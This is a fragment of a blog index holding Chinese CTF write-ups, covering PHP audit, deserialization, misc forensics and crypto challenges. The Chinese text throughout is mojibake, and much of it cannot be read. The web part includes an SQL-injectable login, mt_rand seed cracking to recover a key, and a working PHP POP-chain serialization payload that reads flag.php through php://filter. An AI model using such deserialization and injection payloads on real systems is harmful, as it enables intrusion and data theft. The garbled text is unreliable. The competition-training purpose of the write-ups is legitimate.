\u0026#34;unknown\u0026#34;)) { return \u0026#34;sorry,this way is banned!\u0026#34;; } else { if ($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;] \u0026amp;\u0026amp; strcasecmp($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;], \u0026#34;unknown\u0026#34;)) { $ip = $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]; } else { if (isset ($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] \u0026amp;\u0026amp; strcasecmp($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;], \u0026#34;unknown\u0026#34;) ) { $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; } else { $ip = \u0026#34;unknown\u0026#34;; } } } } return ($ip); } Ezaudit è¿›å»ä¸€ä¸ªå¾ˆæ­£ç»çš„ç½‘ç«™ é“¾æ¥å…¨æ²¡ç”¨ å°±æ˜¯ä¸ªç©ºç½‘ç«™\næ‰«ç«™çœ‹åˆ°ä»¤äººæ¬£æ…°çš„ç»¿è‰²\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #å‹ç¼©åŒ…å°±ä¸€ä¸ªlogin.php \u0026lt;?php header(\u0026#39;Content-type:text/html; charset=utf-8\u0026#39;); error_reporting(0); if(isset($_POST[\u0026#39;login\u0026#39;])){ $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $Private_key = $_POST[\u0026#39;Private_key\u0026#39;]; if (($username == \u0026#39;\u0026#39;) || ($password == \u0026#39;\u0026#39;) ||($Private_key == \u0026#39;\u0026#39;)) { // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢ header(\u0026#39;refresh:2; url=login.html\u0026#39;); echo \u0026#34;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\u0026#34;; exit; } else if($Private_key != \u0026#39;*************\u0026#39; ) { header(\u0026#39;refresh:2; url=login.html\u0026#39;); echo \u0026#34;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\u0026#34;; exit; } else{ if($Private_key === \u0026#39;************\u0026#39;){ $getuser = \u0026#34;SELECT flag FROM user WHERE username= \u0026#39;crispr\u0026#39; AND password = \u0026#39;$password\u0026#39;\u0026#34;.\u0026#39;;\u0026#39;; $link=mysql_connect(\u0026#34;localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;root\u0026#34;); mysql_select_db(\u0026#34;test\u0026#34;,$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result)){ echo \u0026#34;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#34;username\u0026#34;].\u0026#34;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#34;flag\u0026#34;].\u0026#34;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#34;; } } } } // genarate public_key function public_key($length = 16) { $strings1 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $public_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; } //genarate private_key function private_key($length = 12) { $strings2 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $private_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; } $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr\u0026#39;s private_key??? ç®€å•åˆ†æå°±æ˜¯è®©ä½ ç”¨å…¬é’¥æ‰¾ç§é’¥ ç„¶åè¿æ•°æ®åº“ password è¿™é‡Œæœ‰ä¸ªç®€å•çš„SQLæ³¨å…¥\nè¿™æ˜¯ä¸ªä¼ªéšæœºæ•°\tmt_scrand()å’Œmt_rand() ä½¿ç”¨è„šæœ¬php_mt_seedçˆ†ç ´\nç§å­ 1775196155 ç”Ÿæˆç§é’¥ XuNhoueCDCGc\nEzpop è¿›å»ç›´æ¥æ˜¯æºç  æç¤º flagåœ¨flag.php\nè®©å­¦ä¹  ååºåˆ—åŒ–é­”æ³•æ–¹æ³•\tå°±æ˜¯ä¸ªååºåˆ—åŒ–çš„é¢˜\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 Welcome to index.php \u0026lt;?php //flag is in flag.php //WTF IS THIS? //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95 //And Crack It! class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;var); } } class Show{ public $source; public $str; public function __construct($file=\u0026#39;index.php\u0026#39;){ $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39;.$this-\u0026gt;source.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString(){ return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup(){ if(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test{ public $p; public function __construct(){ $this-\u0026gt;p = array(); } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } if(isset($_GET[\u0026#39;pop\u0026#39;])){ @unserialize($_GET[\u0026#39;pop\u0026#39;]); } else{ $a=new Show; highlight_file(__FILE__); } æ€è·¯ï¼šé€šè¿‡ Show è®© Modifier æ¥ include flag.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php class Modifier{ protected $var=\u0026#39;php://filter/read=convert.base64-encode/resource=flag.php\u0026#39;; } class Show{ public $source; public $str; public function __construct($file) { $this-\u0026gt;source=$file; } } class Test{ public $p; public function __construct($p) { $this-\u0026gt;p=$p; } } $show1 = new Show(\u0026#39;add\u0026#39;); $show2 = new Show($show1); $m = new Modifier(); $test= new Test($m); $show1-\u0026gt;str=$test; echo urlencode(serialize($show2)); base64è§£ç å°±æ˜¯flag.phpçš„æºç äº†\nEzpop_Revenge 2020å®‰æ´µæ¯Misc\u0026amp;Crypto writeup æ€»ä½“æ„Ÿè§‰é¢˜ç›®æ²¡å•¥è¥å…»ï¼Œå…¨æ˜¯å‡ºçƒ‚äº†çš„è€ƒç‚¹ï¼Œä¸è¿‡è¿˜æ˜¯æ°´ä¸ªåšå®¢ã€‚\nMisc ç­¾åˆ° ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«æå…³æ³¨å…¬ä¼—å·ï¼Œæ¢å¤flagä¼šç»™ä¸ªå‡çš„flagï¼Œæ ¹æ®hintå›å¤fl4gï¼Œå¾—åˆ°ç½‘ç›˜é“¾æ¥ï¼Œé‡Œé¢æ˜¯ä¸ªwordï¼Œwordé‡Œæ˜¯emojiï¼Œä¸æ˜¯emojicodeï¼Œbase100è§£å¯†å°±æ˜¯flag\nç‹ç‰Œç‰¹å·¥ ç£ç›˜å–è¯ï¼Œä¸€ä¸ªfindmeæ–‡ä»¶ï¼Œæ˜¯ext3ï¼ŒæŒ‚è½½å¾—åˆ°ä¸€ä¸ª flagbox å’Œä¸€ä¸ªkey.txtæç¤ºå¦‚ä¸‹\n1 2 key:a_cool_key use Veracrypt ç”¨VeracryptæŒ‚è½½flagboxï¼Œä¸€ä¸ªå‡flagæ–‡ä»¶ï¼Œæç¤ºå¾€å›çœ‹\n1 extundelete findme --restore-all æ¢å¤fidemeä¸­åˆ é™¤çš„æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ª .coolboy.swp çš„vimç¼“å­˜ï¼Œå¾—åˆ°ä¸€ä¸²base64ï¼š55yf55qE5a+G56CBOnRoaXNfaXNfYV90cnVlX2tleQ==çœŸæ­£çš„å¯†ç  this_is_a_true_keyï¼ŒæŒ‚è½½å¾—åˆ°flag\nå¥—å¨ƒ zipé¢˜ï¼Œç¬¬ä¸€å±‚crcçˆ†ç ´å¾—åˆ°å¯†ç \t!qQIdEa@#!z)\n1 2 3 4 5 6 0xea4446b6 0xed7987de 0x46fe0943 0x4be30989 0xb31975c0 0xd6bb1bef 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # from network import binascii import string def crack_crc(): crc_list = [0xea4446b6,0xed7987de,0x46fe0943,0x4be30989,0xb31975c0,0xd6bb1bef] chars = string.printable for res_crc in crc_list: for str_1 in chars: for str_2 in chars: comment = str_1 + str_2 test_crc = binascii.crc32(comment.encode()) calc_crc = test_crc \u0026amp; 0xffffffff if calc_crc == res_crc: print(comment) if __name__ == \u0026#39;__main__\u0026#39;: crack_crc() ç¬¬äºŒå±‚æ˜æ–‡æ”»å‡»ï¼Œåšçš„æ—¶å€™é‡åˆ°ç‚¹é—®é¢˜ï¼Œå¯†ç å‡ºæ¥ %3#c$v!@ ä½†æ˜¯è§£å¯†æ–‡ä»¶å¤±è´¥ï¼Œå‘ç°åŸå› äº†ï¼Œä¼ªåŠ å¯†å»æ‰å°±å¯ä»¥æ­£å¸¸è§£å¯†äº†ï¼Œæˆ–è€…flag.txtå•ç‹¬æ‹–å‡ºæ¥è§£å¯†ä¹Ÿè¡Œã€‚\nå¾—åˆ°ä¸€ä¸²fgic__notl{prwc__}az\u0026amp;ceadi@ï¼Œåœ¨çº¿è§£æ …æ å¾—åˆ°flag{zip\u0026amp;crc_we_can_do_it}@\nBeCare4 æ‹¿äº†ä¸ªä¸€è¡€ï¼Œè¿™é¢˜åˆ°æœ€åéƒ½450åˆ†+æ˜¯æˆ‘æ²¡æƒ³åˆ°çš„\nä¸€ä¸ªæ–‡æœ¬ï¼Œæƒ³ç™¾åº¦æ‰¾æ‰¾æ–‡ç« å‡ºå¤„ï¼Œç²˜è´´çš„æ—¶å€™å‘ç°æ˜¯é›¶å®½å­—èŠ‚ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç \noh,you found the pass:RealV1siBle è§£å‹åå¾—åˆ°å›¾ç‰‡ï¼Œç›´æ¥ silenteye å‡ºflag\nCrypto å¯†ç å­¦ï¼Ÿçˆ†ç ´å°±è¡Œäº† å¯†ç ç­¾åˆ°é¢˜ï¼Œå°±æ˜¯çˆ†ç ´ï¼Œæ”¾æœåŠ¡å™¨ä¸Šè·‘äº†ä¸€ä¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import hashlib from string import ascii_lowercase,digits table = ascii_lowercase+digits ciphier = \u0026#39;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a\u0026#39; for a in table: for b in table: for c in table: for d in table: for e in table: for f in table: flag = \u0026#39;d0g3{71b2b5616\u0026#39;+a+b+\u0026#39;2a4639\u0026#39;+c+d+\u0026#39;7d979\u0026#39;+e+f+\u0026#39;de964c}\u0026#39; tmp = hashlib.sha256(flag).hexdigest() if tmp == ciphier: print(flag) exit() 1 d0g3{71b2b5616ee2a4639a07d979ebde964c} easyaes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from Crypto.Util.number import * from Crypto.Cipher import AES msg = b\u0026#39;Welcome to this competition, I hope you can have fun today!!!!!!\u0026#39; hint_key = 56631233292325412205528754798133970783633216936302049893130220461139160682777 last32 = \u0026#39;3c976c92aff4095a23e885b195077b66\u0026#39; # print(hex(hint_key)) # 0x7d3424647d3424647d3424647d34246419044357064341081e5b4901045b5119L hint = hex(hint_key)[2:10]*8 key = hint_key^eval(\u0026#39;0x\u0026#39;+hint) key = long_to_bytes(key) print(\u0026#34;key:\u0026#34;+key) # d0g3{welcomeyou} aes=AES.new(key,AES.MODE_ECB) tmp = long_to_bytes(0x3c976c92aff4095a23e885b195077b66) for i in range(4, 0, -1): tmp = aes.decrypt(tmp) tmp = long_to_bytes(bytes_to_long(tmp) ^ bytes_to_long(msg[16*(i-1):16*i])) print(tmp) easyrsa challenge1è´¹é©¬å°å®šç† å¼€æ–¹å¾—åˆ°m å³p\nchallenge2ç­¾åˆ°æ°´å¹³ç»™ä¸ªhintFlag is a 764-length number that starts with \u0026quot;å¤ªé•¿äº†ï¼Œå°±ä¸è´´äº†ï¼Œè‡ªå·±è·‘å»ã€‚\u0026quot;, and CYZ says he can solve the problem if he was given two more numbers\nchallenge3ç»™äº†flagé«˜ä½,eå¾ˆå°,CopperSmithè§£ä¸€æ³¢\nåœ¨çº¿çš„sageè·‘ä¼¼ä¹å‡ºäº†ç‚¹å°é—®é¢˜ï¼Œè§£å‡ºxæ²¡é—®é¢˜ï¼Œä½†æ˜¯æœ€åè¿ç®—ä¸çŸ¥é“ä¸ºå•¥å‡ºé”™ï¼Œè‡ªå·±æŠŠxè´´å›æ¥ç„¶ålong_to_byteså°±è¡Œäº†ohhhhhhhhhhhhhhhhhhhhhhhh!You are good at math and crypto ,I hope you have fun today.We should think of not only the small plaintext attack, but also the coppersmith attack when e is smallWHAT?You say you only wanna flag and don' want to talk with me .OK,fine! The flag is : d0g3{e173c0f114c59c2bdea69c67422be407}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from Crypto.Util.number import * from gmpy2 import * # --------------challenge 1------------- n = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677524091351680654318535417344913749322340318860437103597983101958967342493037991934758199221146242955689392875557192192462927253635018175615991531184323989958707271442555251694945958064367263082416655380103916187441214474502905504694440020491633862067243768930954759333735863069851757070183172950390134463839187 c = 522627051172673216607019738378749874116772877858344748349627321977492158105699887369893079581450048789131578556338186004983533975454988450450635141267157135506032849129152411194539350100279698888357898902460651973610161382266600081865609650174137113252711515464274593530115825189780860732147803369868525723790644619452538755225868382505974710418995847979384726953915873857530098330095151094837190566851416540540805185485212577333604309698822785682707412587829684108913753204398552196441996201678339688766979634246337855516220753995430266970473808724410357458278585135750810810484678948146374963838334596646926215341 hint1 = 134805774328615624446574490322803283547316698647214138487576352482438867186094276263735342558169004773286779632939369099910639984165263724781958841009573156241531958373198729926012152201548649349842790727259831232277600944618096069835436884888782994513452252257103877595707828731260669076400456300668581565291455061609385003064649522735776446930209884653223939689686840631001863143579575759834304817613040932998629846110770749941179601474484275548912570668460216633586988225562794026430881265344731575650165992321629617982004131413202026628777742093026476064486873565664625105013298396598413667761372217260994853420062861590358 # hint1 = 2 * d + 246810 * e * phi m = pow(c,hint1,n) m = iroot(m,2)[0] print(\u0026#39;m\u0026#39;,m) # 234702123 # --------------challenge 2------------- q = m e = 0x10001 n = 133561991523711714238641512987809330530212246892569593026319411449791084194115873781301422593495806927875828290629679020098834182528012835469352471635087375406306534880352693134486855968468946334439553553593196889196239169351375517588892769598963002098115826389220099548938169095670740942251209102500450728442583559710183771974489284632651296188035458586935211952691589627681567274801028577256215269233875203212438263987034556969968774119389693056239796736659926866707857937025200924828822267781445721099763436020785585453958594470906716195030613615725126057391084801585533926767137218524047259398886392592317910204988634868663634415285507325190415658931169841182499733179254162060738994027842088553562013488445789594342451823783136881968032197575016845492231433684884872631894561254381663562267075103417879327236182565223877901300392217967589154857009356640377622996801781797109089687661697856930394706016954531077165127402008444818092498106642068414208190583373314287381712963712098566595399301400378116274132918572709221391531621228936206630829355801192700264684469488261781954165940553346889395507153750291402535330239420975542926664420153925171757944018621411265539452424569343708318070259746118326558005521868356304582694159507379335214599839668805877215983938986674084063185863612335339836810044252829401409522709997562887276661672718820881541500852400369184737236082178767653725044900394959369367604992512713490494168594433000695046297712977059205623777990102604073885527049867682390577577616773090662829024271568456346362315351643767420198116229892060385453123572533267805396437865025639093881944841521458804810097550625853182396288247815370818578103543117466070812804267915674186488979548392193291727228018246788487524292081389142018151246889408421936865224469589631518283230229213787648552632437566756058034131355439709320923876063030896228165897498746898125821639893238387694549304110003941329763552493326245073779912107372271854798616245416264801377068163622812994786201580895459712414134184992440395336131037558976058298521312536969408724436512019410835904564817724243688308776888170183074838453466914170790840559860531933430176605716828492670093771129301541861534595181565621644268739349035133062776852304594204220291667924128313579203359827093150911871520605180797438668872585571501531844999598674037998642821148417473110716470439750642781609483016636419373004760601783594025036152924259863627732874940148083408474700265895269165869619971810103499607445649821 p = 689159326758330864205993810270646658558112329195746149991184055909755461246626153920231796960903018393806410715812453949253930576368274228434916375544579284365205241766136566047482065208442992856658212126772417415403473480889927931481129434854332858754668120563818975006384512615022532233244596546830392476321031156328699572283946257730515089543367929326280871305776349305346159311591820455943842203357066465523558715870586535188343603460826231817622511283563179065036619023415848694281294463836320838105950552498785365535923041927491743402053568747113507098917091780797009380675587381805253390649630338055131031679595664055361678114747608302944715308343764678875659039394225950479683967885912291399162609094622980318391045105733088508798371414996479107970975717563552614856114065668728607215268431341079233630995168600896375314067716366181300081684353583326214062788182429536300917720999423489104723824360299238754986351169209709892739317096741609428484854087163771300777717883057028145424827875496235567904291417092378448353222179114362314382900648079547647848024440220204768433974038004942869937932015294078073975703156613070125753344841550872429670559866184492945262960524545894823245933714684747784492095876370443994948425495841 c = 65553658155452064459040687299632299415295760116470555100400688788937893101658136830409082198753928673469636810831761104117535054304536941814523449491308187105740319828511969750359402834799486354958723098881095067882833993358468923611118977258293638107874383059048015701807718209929028151240509801801995570592890519253676774278321334154528938199389248563657673061299152526380072934917964488153875744843855913524788571997024947738868563951687976817548296078497817264410193882661874749304071168979787307490320366615899942861059615405569154961435894469325778407081182151320629413711622905703628430999201763846682516985530373643176026602901129520439581385946775511292435206913016381293219606333035648747877313424616408338829137581998558399694071257787294948211441360283876078405831210625321012072477187438320944119825970347654743794743846351762763177440045084761025728597526592892602263484022280653040195670941221493307430623213388669939114424884078502946247136016528925968280034099568454876076717790529204207317485416329062672971939549478648687894958552760953682796211975576320713576155031581257782352223857605149825435939889497465805857339911597479498085071301601506276220487493620870555545057189236870008182212284992968466451864806648279032294546676543599599279519394341289357968292292966055189578253350591765186079486142930848439238134776982658066494378507873003509820326863340562093906137812952544399266821679905073464535234547335867090392493005792528534561846391285698943396889671437127470587837989050518266365099789392584686615435440486086402941357614369171354355307532351370775920044953381482310949663868493911752104873824099597326393857349237228788875273525189373323552519106738497767546337587947368062413334887230166285909705065920918078052826480092129173127887307158867274895914733110276134124505178182548094607594799978378381804502097507167978950926067243870989514735314054362049917668015341349933704885009878192354865067520219676784278082055728039064858769077997521541853184489175120623176481708269464933868222226748491078319156602229948646960513946846417957356535995079525993783278312017766715177078804065822913241465133977233398851120059496221650357891946344151601586169979516826622503491746992282716591488199657450776596383692706657692673860134555990821730412919497018889046615548520878486492644159735144935329502984929679831356967030870226422768447430410031028770529758721438528263719267616233686813781828066547393953352033364851486926368090757420184816634373721 # r = n//q//p # phi = (p-1)*(q-1)*(r-1) n = n//q r = n//p phi = (p-1)*(r-1) d = invert(e,phi) hint2 = pow(c,d,n) # print(hint2) print(long_to_bytes(hint2)) \u0026#39;\u0026#39;\u0026#39; Flag is a 764-length number that starts with \u0026#34;11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047\u0026#34;, and CYZ says he can solve the problem if he was given two more numbers \u0026#39;\u0026#39;\u0026#39; # --------------challenge 3------------- e = 5 n = 14857387925078594782296815160632343246361073432459148990826882280149636079353743233970188012712079179396872746334143946166398665205889211414809061990804629906990919975187761209638578624750977626427334126665295876888197889611807587476285991599511809796600855689969285611439780660503760599419522224129074956376232480894299044645423966132497814477710701209588359243945406653547034819927990978087967107865071898215805154003530311865483912924517801551052430227039259201082691698480830966567550828053196299423168934840697637891311424286534363837640448614727396254288829197614805073711893711252067987576745683317789020760081 c = 14035143725862612299576867857272911865951893239411969382153274945929406881665641140566462510177132511558933111728871930062074990934496715765999564244916409345156132996227113853067808126894818934327468582686975383715892108247084995817427624992232755966398834682079985297050358462588989699096264155802168300026093598601350106309023915300973067720164567785360383234519093637882582163398344514810028120555511836375795523327469278186235781844951253058134566846816114359878325011207064300185611905609820210904126312524631330083758585084521500322528017455972299008481301204209945411774541553636405290572228575790342839240414 \u0026#39;\u0026#39;\u0026#39; # sagemath m_high = 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047 R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = (m_high * (10**54)+ x) ** 5 - c solve = f.monic().small_roots(X=2 ^ 200, beta=1) x = solve[0] # è¿™é‡Œåœ¨çº¿sageè·‘å‡ºæ¥ä¼šé”™ï¼Œç›´æ¥æ‰“å°xç„¶åè´´å›æ¥å°±å¥½ flag = (m_high * (10**54)+ x) print(x) \u0026#39;\u0026#39;\u0026#39; flag = 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047675003330981130439478093707252121278358852500850751357 print(long_to_bytes(flag)) ","description":"","id":30,"section":"posts","tags":["CTF","WP"],"title":"2020CTF WP","uri":"https://ruokeqx.gitee.io/posts/2020ctfwp/"},{"content":" misc ä¸€â€œé¡µâ€éšœç›®ï¼šps\nå£®è¨€å£®è¯­ï¼šä¸ä½›è®ºç¦…\nç§˜æŠ€Â·åå¤æ¨ªè·³ï¼š010editorï¼Œps\næ¥æ‹¼å›¾ï¼šæ‰‹åŠ¨æˆ–è€…python\né£ç¿”çš„åˆ˜å£®ï¼šç©æ¸¸æˆæ‹¿flag\nå‰æ™®èµ›çš„æ­Œå§¬ï¼špython\nCrypto äºŒæˆ˜æƒ…æŠ¥å‘˜åˆ˜å£®ï¼šæ‘©æ–¯\né“ ç”²ä¸è¨æ»¡ï¼šå‡¯æ’’\nè·³è·ƒçš„æŒ‡å°–ï¼šé”®ç›˜\næˆéƒ½å…»çŒªäºŒå‚ï¼šçŒªåœˆ+æ …æ \nè§„è§„çŸ©çŸ©çš„å·¥ä½œï¼šçº¿æ€§ä»£æ•°\nbabyRSAï¼šRSA\nSimple calculationï¼šçº¿æ€§ä½™æ•°æ–¹ç¨‹ç»„ï¼Œä¸­å›½å‰©ä½™å®šç†\néŸ¡é«»çŒŠå²ˆï¼šå¼—å‰å°¼äºš\nchildRSAï¼šå¹¿æ’­æ”»å‡»ï¼Œä¸­å›½å‰©ä½™å®šç†\nStrange codeï¼š\nfunny rsaï¼šä¸­å›½å‰©ä½™å®šç†ï¼Œz3ï¼Œdp dqæ³„éœ²ï¼Œnextprime\nweb æœ‹å‹çš„å­¦å¦¹ï¼šf12\nEZwww: ç½‘ç«™å¤‡ä»½\nåˆ˜å£®çš„é»‘é¡µï¼šè¯·æ±‚æ–¹å¼\nWelcomeï¼š405 ç®€å•phpç»•è¿‡ phpinfo åŒ…å¤´\nEZgit: gitæ³„éœ²\næˆ‘æ˜¯å¤§é»‘å®¢ï¼šåé—¨è¿æ¥\nezbypassï¼šphpç®€å•ç»•è¿‡\nå¸¦æ¶äººå…­æ’: æŠ¥é”™æ³¨å…¥\nMisc ä¸€â€œé¡µâ€éšœç›® å®£ä¼ å•é‡Œflagæ¨ªåˆ‡äº†ï¼Œpsä¸€ä¸‹å°±è¡Œ\nå£®è¨€å£®è¯­ ä½›æ›°ç›´æ¥åœ¨çº¿è§£\n1 ä½›æ›°ï¼šè±†æ¢µèƒ½ä½›å†¥è¬¹æ²™æ€¯éš¸é“ç­‰å­•å–ä¼½è¨¶æå¥¢è€¶å°¼æ®¿æ€¯æ€–å¥¢ä¸‰ç¼½å—æ€›ç¼½å¨‘çš¤å¯«æ•¸çš¤ç©¶å‘è€…é†¯çš¤å‹å­•çš¤é¡›çš¤è€¶å¤œå“†æ‚‰ä¾„ç¾¯æ¶…æ‚‰æ€¯è€è‹¥ä¿±å‹è©çŸ¥è©æ‰€è˜‡å¥¢ä»¥æ¢µä¸–å¿ƒäº¦å‘è€¨å¤·å“†è‡³å“†é†¯å³æ³¢æ€¯æ˜é™¤æ€¯é—æ€¯é›†æ€¯å°¼æ˜çš¤å¯¦æ€¯ä¸€å¿ƒç¼½å‘¼ä¾„ç¾¯å¤¢å®¤è«³è€¨å‘æè¿¦æ¢µéƒ½éƒ½å‘å­•ç¤™è«³é‚£å‘å½Œè±†ç¼½æ™ºé®è«³æ§ƒæä¼½ä¿±ç©†é›¢å†¥ä¼Šå†¥é‚£è—ç½°æ‘©è¿¦è«³æœ‰è«³ç›¡å³æ€¯å¤šé€ä¾„å©†å†¥æ¶…ç¥ ç§˜æŠ€Â·åå¤æ¨ªè·³ zipé‡Œæœ‰ä¸ªå›¾ç‰‡ï¼Œå›¾ç‰‡å°¾éƒ¨æœ‰ä¸ªzipï¼Œæ‰‹æ‹¿ä¹Ÿè¡Œï¼Œbinwalkä¹Ÿè¡Œï¼Œå¾—åˆ°å·¦å³æ¢çš„äºŒç»´ç ï¼Œpsæ¢å¤ä¸€ä¸‹å°±è¡Œ\né£ç¿”çš„åˆ˜å£® æ¸¸æˆé¢˜ï¼Œåªæœ‰åœ¨ç¬¬11ä¸ªæŸ±å­æ­»æ‰æœ‰flagã€‚\næ¥æ‹¼å›¾ æ‹¼å›¾é¢˜å‡ºè¿‡å¥½å¤šäº†ï¼Œå¯ä»¥æ‰‹æ’•ï¼Œä¹Ÿå¯ä»¥æ‹¿ä¸ªè„šæœ¬æ‰¾å‡ºä¸ä¸€æ ·çš„ç„¶åpsä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 from cv2 import cv2 from PIL import Image import os import shutil target = cv2.imread(\u0026#34;./source.jpg\u0026#34;) def match(temp_file): template = cv2.imread(temp_file) theight, twidth = template.shape[:2] result = cv2.matchTemplate(target,template,cv2.TM_SQDIFF_NORMED ) cv2.normalize( result, result, 0, 1, cv2.NORM_MINMAX, -1 ) min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result) return abs(min_val) os.mkdir(\u0026#34;./selected\u0026#34;) dst_path=\u0026#34;./selected\u0026#34; dirs = os.listdir(\u0026#34;./pingTu\u0026#34;) count=0 for k in dirs: if(k.endswith(\u0026#39;jpg\u0026#39;)): count+=1 print(\u0026#34;processing on pic\u0026#34;+str(count)) real_path=os.path.join(\u0026#34;./pingTu\u0026#34;,k) rect=match(real_path) if rect\u0026gt;1e-10: print(rect) shutil.move(real_path,dst_path) else: continue Crypoto äºŒæˆ˜æƒ…æŠ¥å‘˜åˆ˜å£® 1 ä½ èƒ½çŸ¥é“åˆ˜å£®åœ¨è¯´ä»€ä¹ˆï¼Ÿå¾—åˆ°çš„flagåŒ…è£¹ä¸ŠSYC{} .-../.----/..-/--../..../..-/....-/-./--./..--.-/../..--.-/--../.----/-.--/.---- æ‘©æ–¯å¯†ç è§£å¯†å°±è¡Œï¼Œç…§ç€è¡¨ä¹Ÿè¡Œï¼Œåœ¨çº¿è§£å¯†ä¹Ÿè¡Œ\né“ ç”²ä¸è¨æ»¡ 1 YEI{roafnagtmroafnagtm_hgtmhgtmhgtm} å‡¯æ’’åŠ å¯†ï¼Œä¸€ç§æœ€ç®€å•çš„ä½ç§»å¯†ç ï¼Œåœ¨çº¿è§£å¯†ä¹Ÿè¡Œï¼Œæ‰‹æ’•ä¹Ÿè¡Œï¼Œè‡ªå·±å†™ä¸ªè„šæœ¬ä¹Ÿè¡Œ\nè·³è·ƒçš„æŒ‡å°– 1 é¢˜ç›®æè¿°:wdr qsz awdx thu xdv eft thu ol rgy 